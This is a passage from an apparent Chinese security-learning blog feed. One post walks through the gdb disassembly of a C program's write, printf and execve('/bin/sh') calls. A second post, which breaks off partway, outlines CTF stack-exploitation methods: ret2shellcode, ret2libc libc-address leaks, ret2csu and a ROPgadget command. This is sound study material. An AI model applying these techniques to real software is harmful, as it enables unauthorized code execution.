color="red">解答：看后面的汇编分析，本来以为看完全篇读者应该能理解，但发现读者并不会认真看全文，而且个人文笔原因，读者可能不能做到完全知道我想讲什么，所以有些地方还需要解释一下，红色字体即为后期添加的解释。目前是参数入栈环节，也就是前7行代码吧，int、char在前几行图中未显示出来的汇编代码处已经入栈，具体分析看后面对main函数的整体汇编即可</b></p><p>③：为什么printf函数的参数在write函数开始执行前就入栈了？这对write函数尊重吗？</p><p>​        write函数：？！我三个参数一个都还没入，你printf就先入了俩，我write函数不要面子的 ？？？</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<b color="red">解答：目前入栈的不是printf的参数，是前七行代码正常的参数入栈，所以并不是printf的参数在write函数前入栈，具体分析看后面对main函数的整体汇编即可，总的来说就是把那段对main函数的汇编代码分析看懂，再看看总结部分就应该知道我想表达什么了</b></p><p>3、继续往下走，write函数执行完后</p><p><img src="image-20220807175042835.png" alt="image-20220807175042835"></p><p>4、下面的话改一下，r8不是存第五个参数的吗？<b color="red">解答：此时r8用作暂存数据</b></p><p><img src="image-20220807175442491.png" alt="image-20220807175442491"></p><p>5、估计之后r8会被重新成printf第五个参数的值（d=6），那他做这一步r8赋值有什么用？冗余操作？<b color="red">解答：编译器优化结果，为了效率吧</b></p><p><img src="image-20220807191732809.png" alt="image-20220807191732809"></p><p>到这了，先说点个人想法吧，讲真，这底层的运行逻辑完全与我认为的应该是怎么怎么样的背道而驰</p><p>①：我觉得printf的参数就应该在write函数调用完后才入寄存器|栈（中间的”|”表示 或 ），但它printf函数的两个第六个以后的字符串地址就先入了栈</p><p>②：我觉得printf的第六个之后的参数的入栈顺序就应该是先从高地址开始入栈然后其它参数再逐步写入栈的低地址，但实际就是低地址的参数（printf的第八个参数）先入了栈，然后逐步高地址的参数（printf的第七）入栈，至于第九和第十目前还没执行到那，还不清楚，__估计是第十个先入，第九个再入高地址__，这回应该不会被打脸</p><p>③：我觉得printf函数的参数就应该一次性入栈，但他就不是（write执行前，printf入了两个指针参数到栈上）</p><p>④：我觉得它那栈上应该就是对齐的，一个64位空间就只存一个地址数据或单个数据，好家伙，它一个64位地址空间，低六字节存了一个地址数据，最高一字节空间存了一个参数的值，有必要这么省吗</p><p>我现在算是明白64位系统为什么还会有32位寄存器（esi、edi那些e开头的）那一套了，省空间呗，提高效率呗，离谱，rdi的低32位在这里被命名为edi，那rdi的高32位在这里叫啥？</p><p>感想：有够离谱的，这真是地球人能想出来的做法吗？合着我是火星来的外来物种是吧，压根就无法理解。可能是这样搞来搞去真的会在 <strong>空间&amp;效率</strong> 上取得最优解，毕竟我目前又不搞底层这些<b color="red">(好吧，我搞得是底层这套，只不过我不是搞编译器开发的)</b>，不知道gcc编译那一套</p><p><b color="red">解答：emm…这一段看看就好，不看也行，重点在 again and again 中的对main函数的汇编代码的分析，之前都只是探索过程，按理来说删掉比较简洁，但个人想保留一下</b></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># 贴太多图加载起来不方便，这里直接把汇编摘出来分析</span><br><span class="line"># 下面左侧小三角代表PC指针，指eip/rip，目前广泛被称为指令指针</span><br><span class="line">   0x5555555551d7 &lt;main+78&gt;     mov    edi, 1</span><br><span class="line">   0x5555555551dc &lt;main+83&gt;     mov    eax, 0</span><br><span class="line">   0x5555555551e1 &lt;main+88&gt;     call   write@plt                &lt;write@plt&gt;</span><br><span class="line"> </span><br><span class="line">   0x5555555551e6 &lt;main+93&gt;     movsx  esi, byte ptr [rbp - 0x21]#rbp低地址0x21字节赋值给esi</span><br><span class="line">   0x5555555551ea &lt;main+97&gt;     movsx  r8d, byte ptr [rbp - 0x21]</span><br><span class="line"> ► 0x5555555551ef &lt;main+102&gt;    mov    edi, dword ptr [rbp - 0x14]</span><br><span class="line">   0x5555555551f2 &lt;main+105&gt;    mov    ecx, dword ptr [rbp - 0x18]</span><br><span class="line">   0x5555555551f5 &lt;main+108&gt;    mov    edx, dword ptr [rbp - 0x1c]</span><br><span class="line">   0x5555555551f8 &lt;main+111&gt;    mov    eax, dword ptr [rbp - 0x20]</span><br><span class="line">   0x5555555551fb &lt;main+114&gt;    push   rsi</span><br><span class="line">   0x5555555551fc &lt;main+115&gt;    mov    esi, dword ptr [rbp - 0x20]</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>我好想明白了些什么，还是得从main函数的开始说起</strong></p><h1 id="again-and-again"><a href="#again-and-again" class="headerlink" title="again and again"></a>again and again</h1><p>6、disass main</p><p><img src="image-20220807195225186.png" alt="image-20220807195225186"></p><p>7、x/60gx 0x0000555555555189</p><p><img src="image-20220807195923209.png" alt="image-20220807195923209"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从图6中的&lt;+0&gt;、&lt;+4&gt;、&lt;+5&gt;、&lt;+8&gt;，再在我们的图七&lt;main&gt;到&lt;main+16&gt;中可以看出我们的&lt;main&gt;到&lt;main+8&gt;这小小的一段64bit空间，竟能供四条指令使用（这四条指令执行了一个函数头）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">&lt;+0&gt;:endbr64 </span><br><span class="line">&lt;+4&gt;:push   rbp</span><br><span class="line">&lt;+5&gt;:mov    rbp,rsp</span><br><span class="line">&lt;+8&gt;:sub    rsp,0x30</span><br><span class="line">#总体效果：执行了一个函数头</span><br><span class="line">#&lt;+4&gt;:上一函数的rbp栈帧入栈保证main函数执行完后能回到上一函数继续执行上一函数</span><br><span class="line">#&lt;+5&gt;:将rsp指向rbp，之后rbp保持不动，就靠rsp不断向低地址生长完成main函数的所有代码逻辑</span><br><span class="line">#&lt;+8&gt;:rsp向低地址生长0x30 = 48个字节，</span><br><span class="line">     #给一些你定义的变量腾处暂存空间，这个值会根据你定义的某些变量的数量而改变</span><br><span class="line"></span><br><span class="line">&lt;+12&gt;:mov    DWORD PTR [rbp-0x20],0x3  #--因为有自带的注释，所以中间部分我加的注释用#--开头</span><br><span class="line">                                         #--将0x3 写入rbp-0x20位置，占用4字节（int）</span><br><span class="line">&lt;+19&gt;:mov    DWORD PTR [rbp-0x1c],0x4  #--将0x4 写入rbp-0x1c位置，占用4字节（int）</span><br><span class="line">&lt;+26&gt;:mov    DWORD PTR [rbp-0x18],0x5  </span><br><span class="line">&lt;+33&gt;:mov    DWORD PTR [rbp-0x14],0x6  </span><br><span class="line">&lt;+40&gt;:mov    BYTE PTR [rbp-0x21],0x67  #--将0x67写入rbp-0x21位置，占用1字节（char）</span><br><span class="line">&lt;+44&gt;:lea    rax,[rip+0xe4c]        # 0x555555556008 #--msg字符串地址写入rax 下方图8</span><br><span class="line">&lt;+51&gt;:mov    QWORD PTR [rbp-0x10],rax  #--将rax写入rbp-0x10位置，占用8字节 图9 </span><br><span class="line">&lt;+55&gt;:lea    rax,[rip+0xe52]        # 0x555555556019 #--abc字符串地址写入rax</span><br><span class="line">&lt;+62&gt;:mov    QWORD PTR [rbp-0x8],rax   #--abc字符串地址写入rbp-0x8，占用8字节</span><br><span class="line">&lt;+66&gt;:mov    rax,QWORD PTR [rbp-0x10]  #--msg字符串地址写入rax</span><br><span class="line">#总体效果，完成参数入栈</span><br><span class="line">#看来write函数前msg、abc先入栈是第6、7行代码的效果，与printf无关  &lt;+62&gt;、&lt;+66&gt;</span><br><span class="line">  </span><br><span class="line">&lt;+70&gt;:mov    edx,0xa   #--0xa写入edx   write的第三个参数10               </span><br><span class="line">&lt;+75&gt;:mov    rsi,rax   #--rax写入rsi   write的第2个参数msg字符串地址</span><br><span class="line">&lt;+78&gt;:mov    edi,0x1   #--0x1写入rdi低32字节  write的第1个参数1</span><br><span class="line">&lt;+83&gt;:mov    eax,0x0   #--0x0写入eax   奇怪的事情发生了，见图10</span><br><span class="line">&lt;+88&gt;:call   0x555555555070 &lt;write@plt&gt;#--调用write函数过程</span><br><span class="line">#效果：代码第9行write函数的执行</span><br><span class="line">#可以看到write的第三个参数10最先写入rdx</span><br><span class="line">#其次是第二个参数msg字符串写入rsi</span><br><span class="line">#最后才是第一个参数写入rdi</span><br><span class="line"></span><br><span class="line">&lt;+93&gt;:movsx  esi,BYTE PTR [rbp-0x21]   #--0x67写入esi </span><br><span class="line">&lt;+97&gt;:movsx  r8d,BYTE PTR [rbp-0x21]   #--0x67  e=&#x27;g&#x27;</span><br><span class="line">&lt;+102&gt;:mov    edi,DWORD PTR [rbp-0x14]  #--0x6   d=6</span><br><span class="line">&lt;+105&gt;:mov    ecx,DWORD PTR [rbp-0x18]  #--0x5   c=5</span><br><span class="line">&lt;+108&gt;:mov    edx,DWORD PTR [rbp-0x1c]  #--0x4   b=4</span><br><span class="line">&lt;+111&gt;:mov    eax,DWORD PTR [rbp-0x20]  #--0x3   a=3</span><br><span class="line">&lt;+114&gt;:push   rsi                       #--0x67入栈 此时rsp = 0x7fffffffdd48</span><br><span class="line">&lt;+115&gt;:mov    esi,DWORD PTR [rbp-0x20]  #--0x3   a=3</span><br><span class="line">&lt;+118&gt;:push   rsi                       #--0x3入栈  此时rsp = 0x7fffffffdd40</span><br><span class="line">&lt;+119&gt;:push   QWORD PTR [rbp-0x8]       #--abc字符串地址入栈  rsp = 0x...dd38 </span><br><span class="line">&lt;+122&gt;:push   QWORD PTR [rbp-0x10]      #--msg字符串入栈</span><br><span class="line">&lt;+125&gt;:mov    r9d,r8d                   #--0x67  e=&#x27;g&#x27;</span><br><span class="line">&lt;+128&gt;:mov    r8d,edi                   #--0x6   d=6</span><br><span class="line">&lt;+131&gt;:mov    esi,eax                   #--eax的0x3赋给esi，原本esi也为0x3</span><br><span class="line">&lt;+133&gt;:lea    rdi,[rip+0xe1b]        # 0x555555556030 #--printf第一个参数地址赋给rdi</span><br><span class="line">&lt;+140&gt;:mov    eax,0x0                   #--rax置0</span><br><span class="line">&lt;+145&gt;:call   0x555555555080 &lt;printf@plt&gt;  #--调用printf函数过程</span><br><span class="line">#效果：代码第11行printf函数的执行</span><br><span class="line">#rdi、rsi、rdx、rcx、r8、r9依次存函数的第1-6个参数</span><br><span class="line">#从上面这一小段来看:</span><br><span class="line">  # &lt;+133&gt; printf第1 个参数赋给rdi &quot;\na=%d b=%d c=%d d=%d e=%c msg=%s abc=%s a=%d e=%c\n&quot;</span><br><span class="line">  # &lt;+131&gt; printf第2 个参数赋给rsi a=3</span><br><span class="line">  # &lt;+128&gt; printf第5 个参数赋给r8  d=6</span><br><span class="line">  # &lt;+125&gt; printf第6 个参数赋给r9  e=&#x27;g&#x27;</span><br><span class="line">  # &lt;+122&gt; printf第7 个参数入栈    msg字符串</span><br><span class="line">  # &lt;+119&gt; printf第8 个参数入栈    abc字符串</span><br><span class="line">  # &lt;+118&gt; printf第9 个参数入栈    a=3</span><br><span class="line">  # &lt;+114&gt; printf第10个参数入栈    e=&#x27;g&#x27;</span><br><span class="line">  # &lt;+108&gt; printf第3 个参数赋给rdx b=4     </span><br><span class="line">  # &lt;+105&gt; printf第4 个参数赋给rcx c=5</span><br><span class="line"></span><br><span class="line">&lt;+150&gt;:add    rsp,0x20                  #--见图11  不知道这一步是用来干嘛的</span><br><span class="line">&lt;+154&gt;:mov    edx,0x0                   #--0x0赋值给edx  rdx用来存储函数的第三个参数</span><br><span class="line">&lt;+159&gt;:mov    esi,0x0                   #--0x0赋值给esi  rsi用于存储函数的第二个参数</span><br><span class="line">&lt;+164&gt;:lea    rdi,[rip+0xe2f]        # 0x555555556063 #--&quot;/bin/sh&quot;地址 rdi存第一个参数</span><br><span class="line">&lt;+171&gt;:call   0x555555555090 &lt;execve@plt&gt;  #--调用execve函数</span><br><span class="line">#效果：代码第13行execve函数的执行</span><br><span class="line">#参数入栈顺序与write函数无异</span><br><span class="line"></span><br><span class="line">&lt;+176&gt;:mov    eax,0x0</span><br><span class="line">#效果：结合后面的函数尾完成代码15行return 0；</span><br><span class="line">#总体效果：main函数所有代码完成执行</span><br><span class="line"></span><br><span class="line">&lt;+181&gt;:leave  </span><br><span class="line">&lt;+182&gt;:ret</span><br><span class="line">#总体效果：执行一个函数尾，main函数结束，返回上一函数</span><br></pre></td></tr></table></figure><p>8、lea    rax,[rip+0xe4c]     <a href="https://blog.csdn.net/qq_38650607/article/details/86765541">汇编：lea指令学习_EagleGoing的博客-CSDN博客_汇编lea</a></p><p><img src="image-20220807210105787.png" alt="image-20220807210105787"></p><p>9、0x7fffffffde70估计是main函数上一个函数遗留在栈上的数据（应该不会有人以为main函数是第一个执行的函数吧？）</p><p><img src="image-20220807210430183.png" alt="image-20220807210430183"></p><p>10、？？？这eax和rax到底有没有区别？</p><p><img src="image-20220807212819877.png" alt="image-20220807212819877"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ok，大佬给出了解释：eax往rax写数据的时候会把rax的高32位清空，eax从rax读数据的时候，只会读rax的第32位字节，64位中这样设计eax只是为了方便读写</p><p>对了，为什么地址要用48位而不用64位？2^48bit=8*2^45bit=2^45B=2^35KB=2^25MB=2^15GB，寻址范围32TB，完全够用了，而且高地址多出来的2字节可以用来存一个char类型变量。</p><p>11、execve(“/bin/sh”,0,0)</p><p><img src="image-20220807233827635.png" alt="image-20220807233827635"></p><p>12、”/bin/sh”</p><p><img src="image-20220807234024500.png" alt="image-20220807234024500"></p><p>13、gdb中无法获取到shell</p><p><img src="image-20220807234627686.png" alt="image-20220807234627686"></p><p>14、可以看到，在用户命令行中执行我们的二进制文件是可以获取到一个shell的，难道说gdb中权限不够？</p><p><img src="image-20220807234721964.png" alt="image-20220807234721964"></p><br/><h1 id="数据的栈上存储"><a href="#数据的栈上存储" class="headerlink" title="数据的栈上存储"></a>数据的栈上存储</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#源C代码</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a=<span class="number">0x12345678</span>,b=<span class="number">5</span>,c=<span class="number">5</span>,d=<span class="number">6</span>,f=<span class="number">0x112233445566778899</span>,g=<span class="number">4</span>,h=<span class="number">3</span>,i=<span class="number">6</span>;</span><br><span class="line">    <span class="keyword">char</span> e=<span class="string">&#x27;g&#x27;</span>;</span><br><span class="line">    <span class="keyword">char</span> *msg=<span class="string">&quot;abcdefg123456789&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> *abc=<span class="string">&quot;aaaabbbbccccdddd&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    write(<span class="number">1</span>,msg,<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\na=%d b=%d c=%d d=%d e=%c msg=%s abc=%s a=%d e=%c\n&quot;</span>,a,b,c,d,e,msg,abc,a,e);</span><br><span class="line"></span><br><span class="line">    execve(<span class="string">&quot;/bin/sh&quot;</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到我们的 f=0x112233445566778899只取了低位的值0x66778899</p><p><img src="image-20220807215116104.png" alt="image-20220807215116104"></p><br/><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">int a=3,b=4,c=5,d=6;</span><br><span class="line">char e=<span class="string">&#x27;g&#x27;</span>;</span><br><span class="line">char *msg=<span class="string">&quot;abcdefg123456789&quot;</span>;</span><br><span class="line">char *abc=<span class="string">&quot;aaaabbbbccccdddd&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\na=%d b=%d c=%d d=%d e=%c msg=%s abc=%s a=%d e=%c\n&quot;</span>,a,b,c,d,e,msg,abc,a,e);</span><br><span class="line">参数1：<span class="string">&quot;\na=%d b=%d c=%d d=%d e=%c msg=%s abc=%s a=%d e=%c\n&quot;</span></span><br><span class="line">参数2、3、4、5、6：a、b、c、d、e</span><br><span class="line">参数7：msg</span><br><span class="line">参数8：abc</span><br><span class="line">参数9、10：a、e</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把汇编代码分析那一段拿出来如下：</span></span><br><span class="line"><span class="comment"># &lt;+133&gt; printf第1 个参数赋给rdi &quot;\na=%d b=%d c=%d d=%d e=%c msg=%s abc=%s a=%d e=%c\n&quot;</span></span><br><span class="line"><span class="comment"># &lt;+131&gt; printf第2 个参数赋给rsi a=3</span></span><br><span class="line"><span class="comment"># &lt;+128&gt; printf第5 个参数赋给r8  d=6</span></span><br><span class="line"><span class="comment"># &lt;+125&gt; printf第6 个参数赋给r9  e=&#x27;g&#x27;</span></span><br><span class="line"><span class="comment"># &lt;+122&gt; printf第7 个参数入栈    msg字符串</span></span><br><span class="line"><span class="comment"># &lt;+119&gt; printf第8 个参数入栈    abc字符串</span></span><br><span class="line"><span class="comment"># &lt;+118&gt; printf第9 个参数入栈    a=3</span></span><br><span class="line"><span class="comment"># &lt;+114&gt; printf第10个参数入栈    e=&#x27;g&#x27;</span></span><br><span class="line"><span class="comment"># &lt;+108&gt; printf第3 个参数赋给rdx b=4     </span></span><br><span class="line"><span class="comment"># &lt;+105&gt; printf第4 个参数赋给rcx c=5    注：这个是这一段中最先执行的指令</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#所以参数写入顺序是4、3、10、9、8、7、6、5、2、1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#所以对于参数入栈顺序，涵盖所有情况的结论不太确定，得看相关手册研究一下源码才能肯定</span></span><br><span class="line"><span class="comment">#但对于write(1,msg,10)、execve(&quot;/bin/sh&quot;,0,0)这样参数较少的函数</span></span><br><span class="line"><span class="comment">#参数写入寄存器的顺序是从右往左，参数标号顺序是从右往左标</span></span><br><span class="line">  <span class="comment">#例如：1   是write的第一个参数，但最后被写入寄存器</span></span><br><span class="line">  <span class="comment">#     msg 字符串是第2，第2</span></span><br><span class="line">  <span class="comment">#     10  是write的第三个参数，但最先被写入寄存器 </span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># rdi、rsi、rdx、rcx、r8、r9依次存储函数的第1、2、3、4、5、6个参数</span></span><br></pre></td></tr></table></figure><p>以下是调用printf函数前的栈上四个数据：从高地址往低地址依次是 e、a、abc、msg</p><p><img src="image-20220820161617609.png" alt="image-20220820161617609"></p><br/><p>总之就是要学的还有很多，有机会的话也要做做开发方面的学习工作</p>]]></content>
    
    
    <summary type="html">iexplore</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>pwn题利用手法</title>
    <link href="http://xiaoxiaoxy1.github.io/2022/08/04/pwn%E9%A2%98%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/"/>
    <id>http://xiaoxiaoxy1.github.io/2022/08/04/pwn%E9%A2%98%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/</id>
    <published>2022-08-04T14:39:48.000Z</published>
    <updated>2022-08-11T02:04:01.763Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 64位需要注意的点</span></span><br><span class="line">1、6个寄存器:rdi、rsi、rdx、rcx、r8、r9   -<span class="comment">#- 链接1 -#-</span></span><br><span class="line">2、edi是rdi的低32位(4字节)               -<span class="comment">#- 链接2 -#-</span></span><br><span class="line">3、cmp  rbx, rbp  执行完函数之后，程序会对rbx+=1，然后对比rbp和rbx的值，</span><br><span class="line">如果相等就会继续向下执行并ret到我们想要继续执行的地址</span><br><span class="line">4、_init、_start、call_gmon_start、deregister_tm_clones、register_tm_clones、</span><br><span class="line">  __do_global_dtors_aux、frame_dummy、__libc_csu_init、__libc_csu_fini、_fini</span><br><span class="line"></span><br><span class="line"><span class="comment"># 32位</span></span><br><span class="line">ROPgadget --binary &lt;二进制文件&gt;  --only <span class="string">&#x27;pop|ret&#x27;</span> | grep <span class="string">&#x27;edi&#x27;</span></span><br></pre></td></tr></table></figure><p>链接1：<a href="http://tianyu-code.top/%E6%B1%87%E7%BC%96/%E5%AF%84%E5%AD%98%E5%99%A8%E4%BB%8B%E7%BB%8D/">linux x86 64位 寄存器</a></p><p>链接2：<a href="https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf">x64_cheatsheet.pdf (brown.edu)</a></p><h1 id="pwn题利用手法"><a href="#pwn题利用手法" class="headerlink" title="pwn题利用手法"></a>pwn题利用手法</h1><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">## 栈</span></span><br><span class="line"><span class="section">#  ret2lib3</span></span><br><span class="line">1、栈溢出-&gt;puts(got.dynamic)泄露libc地址-&gt;反编译libc.so.6计算libc基址并查找</span><br><span class="line">   system()、/bin/sh偏移值</span><br><span class="line">2、栈段RWX，借助jmp rsp片段实现shellcode写入栈，再跳转回去执行shellcode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;</span><br></pre></td></tr></table></figure><h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><h3 id="ctf-wiki"><a href="#ctf-wiki" class="headerlink" title="ctf wiki"></a>ctf wiki</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">###简版</span></span><br><span class="line"><span class="comment">#  基本ROP</span></span><br><span class="line">1、利用程序中现有的后门函数  <span class="comment"># ret至后门函数获取shell  ret2text</span></span><br><span class="line">2、向可执行段写入shellcode  <span class="comment"># ret至shellcode获取shell  ret2shellcode</span></span><br><span class="line">3、利用程序中的ROPgadget、<span class="string">&quot;/bin/sh&quot;</span>构造能获取shell的汇编串  <span class="comment"># ret2syscall</span></span><br><span class="line">4、利用plt表中的system函数地址以及程序中已有的<span class="string">&quot;/bin/sh&quot;</span>字符串  <span class="comment"># ret2libc1</span></span><br><span class="line">5、gets地址覆盖ret达到二次gets效果，二次gets向buf2发送/bin/sh，system调用  <span class="comment"># ret2libc2</span></span><br><span class="line">6、溢出调用puts泄露libc地址，计算偏移找出system()、/bin/sh在libc中位值  <span class="comment"># ret2libc3</span></span><br><span class="line">   补充：ida反编译libc.so.6，找偏移</span><br><span class="line"> </span><br><span class="line">基本ROP有用的知识总结：</span><br><span class="line">  1、调用过一次的函数plt表中存储其真实地址，got表中存储着真实地址，详见详解4</span><br><span class="line">  2、可以将libc.so.6丢进ida中计算偏移值</span><br><span class="line"><span class="comment">##-----------------------------↓↓↓-----------------------------------##   </span></span><br><span class="line">  3、进入函数后会执行一个函数头，把高地址一个位置的数作为上一函数的ebp存储起来，</span><br><span class="line">     然后把高地址两个位置处的数作为函数的第一个参数，至于第二、第三个参数怎么存</span><br><span class="line">     我目前还没看过。 ***做个标记，之后拿<span class="built_in">printf</span>(<span class="string">&quot;%d%d%s&quot;</span>,a,b,s)试试</span><br><span class="line"><span class="comment">##-----------------------------↑↑↑-----------------------------------##     </span></span><br><span class="line">  4、shellcode写法有空深究一下，shellcode中不能带<span class="string">&quot;\x00&quot;</span></span><br><span class="line">  5、PIE：随机化代码段、plt、got、data等</span><br><span class="line">  6、ASLR：随机化stack、libarys(不知道拼没拼错，我copy过来的)、heap等</span><br><span class="line">  7、以下两句给出的是got表中dynamic段的__libc_start_main地址</span><br><span class="line">     ret2libc3 = ELF(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line">     ret2libc3.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"> </span><br><span class="line">基本ROP有用的手法总结：</span><br><span class="line">  1、shellcode写进可执行段，跳转执行</span><br><span class="line">  2、利用ROPgadget，构造system(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">  3、main函数地址覆盖到ret可重新执行main函数</span><br><span class="line">  4、重调puts函数，并以got表dynamic段中函数做参数可泄露libc函数地址</span><br><span class="line">   </span><br><span class="line"><span class="comment">#  中级ROP</span></span><br><span class="line">1、栈溢出-&gt;重调write泄露libc地址，重调main-&gt;重调<span class="built_in">read</span>向bss段写入system(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">   ，main-重调&gt;跳转至bss段地址执行system(<span class="string">&quot;/bin/sh&quot;</span>)  <span class="comment">#ret2csu</span></span><br><span class="line">   <span class="comment">#做题时注意好call指令的跳转存在限制，只能实现近跳转，没ret指令便于利用</span></span><br><span class="line">2、</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><br/><h4 id="基本ROP"><a href="#基本ROP" class="headerlink" title="基本ROP"></a>基本ROP</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 